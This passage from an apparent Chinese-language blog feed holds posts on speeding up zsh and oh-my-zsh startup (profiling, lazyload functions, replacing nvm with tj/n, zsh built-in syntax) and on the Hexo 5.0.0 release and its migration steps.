class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]